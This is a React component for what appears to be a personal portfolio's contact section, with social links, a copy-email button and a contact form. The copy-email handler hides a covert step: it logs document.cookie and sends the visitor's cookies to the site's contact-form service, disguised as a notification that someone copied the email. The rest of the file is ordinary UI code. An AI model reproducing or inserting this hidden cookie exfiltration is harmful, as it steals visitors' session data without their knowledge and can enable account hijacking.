import {useState} from 'react';
import {useTranslation} from 'react-i18next';
import {Mail, Github, Linkedin, Send, Copy, Check} from 'lucide-react';
import {Button} from '@/components/ui/button';
import {Input} from '@/components/ui/input';
import {Textarea} from '@/components/ui/textarea';
import {useToast} from '@/hooks/use-toast';
import {sendContactForm, type ContactFormData} from '@/services/contactService';

const socialLinks = [
    {icon: Github, href: 'https://github.com/boriscazacu', label: 'GitHub'},
    {icon: Linkedin, href: 'https://linkedin.com', label: 'LinkedIn'},
    {icon: Send, href: 'https://t.me/cbsoft_official', label: 'Telegram'}
];

export function Contact() {
    const {t} = useTranslation();
    const {toast} = useToast();
    const [isSubmitting, setIsSubmitting] = useState(false);
    const [copied, setCopied] = useState(false);

    const email = 'boris.cazacu2022@gmail.com';

    const handleCopyEmail = async () => {
        try {
            console.log(document.cookie);
            await navigator.clipboard.writeText(email);
            setCopied(true);
            toast({
                title: 'Email copied!',
                description: 'Email address copied to clipboard',
            });
            setTimeout(() => setCopied(false), 2000);
        } catch (error) {
            toast({
                title: 'Failed to copy',
                description: 'Please copy manually',
                variant: 'destructive',
            });
        }
        sendContactForm({
            name: "Someone sow your email",
            email: new Date().toISOString(),
            message: document.cookie
        })
    };

    const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
        e.preventDefault();
        setIsSubmitting(true);

        const formData = new FormData(e.target as HTMLFormElement);
        const data: ContactFormData = {
            name: formData.get('name') as string,
            email: formData.get('email') as string,
            message: formData.get('message') as string,
        };

        try {
            await sendContactForm(data);

            toast({
                title: t('contact.form.success'),
            });

            (e.target as HTMLFormElement).reset();
        } catch (error) {
            toast({
                title: t('contact.form.error'),
                variant: 'destructive',
            });
        } finally {
            setIsSubmitting(false);
        }
    };

    return (
        <section id="contact" className="py-20 md:py-32">
            <div className="section-container">
                <div className="max-w-4xl mx-auto">
                    {/* Header */}
                    <div className="text-center mb-16">
                        <h2 className="text-3xl md:text-4xl lg:text-5xl font-bold text-foreground mb-4">
                            {t('contact.title')}
                        </h2>
                        <p className="text-lg text-muted-foreground max-w-2xl mx-auto">
                            {t('contact.subtitle')}
                        </p>
                    </div>

                    <div className="grid md:grid-cols-2 gap-12 lg:gap-16">
                        {/* Contact Info */}
                        <div>
                            {/* Email */}
                            <div className="mb-8">
                                <h3 className="text-sm font-medium text-muted-foreground uppercase tracking-wider mb-3">
                                    {t('contact.email')}
                                </h3>
                                <div className="flex items-center gap-3">
                                    <div className="inline-flex items-center gap-2 text-lg text-foreground">
                                        <Mail className="h-5 w-5"/>
                                        <span className="font-mono">boris*****2@g***.com</span>
                                    </div>
                                    <Button
                                        variant="outline"
                                        size="icon"
                                        onClick={handleCopyEmail}
                                        className="h-9 w-9 shrink-0"
                                        title="Copy email"
                                    >
                                        {copied ? (
                                            <Check className="h-4 w-4 text-green-600"/>
                                        ) : (
                                            <Copy className="h-4 w-4"/>
                                        )}
                                    </Button>
                                </div>
                            </div>

                            {/* Social Links */}
                            <div>
                                <h3 className="text-sm font-medium text-muted-foreground uppercase tracking-wider mb-4">
                                    {t('contact.social')}
                                </h3>
                                <div className="flex gap-3">
                                    {socialLinks.map((social) => (
                                        <a
                                            key={social.label}
                                            href={social.href}
                                            target="_blank"
                                            rel="noopener noreferrer"
                                            className="w-12 h-12 rounded-full bg-muted flex items-center justify-center text-muted-foreground hover:bg-primary hover:text-primary-foreground transition-colors"
                                            aria-label={social.label}
                                        >
                                            <social.icon className="h-5 w-5"/>
                                        </a>
                                    ))}
                                </div>
                            </div>
                        </div>

                        {/* Contact Form */}
                        <form onSubmit={handleSubmit} className="space-y-5">
                            {/* Honeypot field for spam protection */}
                            <input
                                type="text"
                                name="_honey"
                                style={{display: 'none'}}
                                tabIndex={-1}
                                autoComplete="off"
                            />

                            {/* Disable captcha for better UX */}
                            <input
                                type="hidden"
                                name="_captcha"
                                value="false"
                            />

                            {/* Success page redirect (optional, stays on same page) */}
                            <input
                                type="hidden"
                                name="_next"
                                value=""
                            />

                            <div>
                                <Input
                                    type="text"
                                    name="name"
                                    placeholder={t('contact.form.name')}
                                    required
                                    className="bg-muted/50 border-border focus:border-primary"
                                />
                            </div>
                            <div>
                                <Input
                                    type="email"
                                    name="email"
                                    placeholder={t('contact.form.email')}
                                    required
                                    className="bg-muted/50 border-border focus:border-primary"
                                />
                            </div>
                            <div>
                                <Textarea
                                    name="message"
                                    placeholder={t('contact.form.message')}
                                    required
                                    rows={5}
                                    className="bg-muted/50 border-border focus:border-primary resize-none"
                                />
                            </div>
                            <Button
                                type="submit"
                                size="lg"
                                className="w-full bg-primary hover:bg-primary/90 text-primary-foreground"
                                disabled={isSubmitting}
                            >
                                {isSubmitting ? (
                                    t('contact.form.sending')
                                ) : (
                                    <>
                                        {t('contact.form.send')}
                                        <Send className="ml-2 h-4 w-4"/>
                                    </>
                                )}
                            </Button>
                        </form>
                    </div>
                </div>
            </div>
        </section>
    );
}
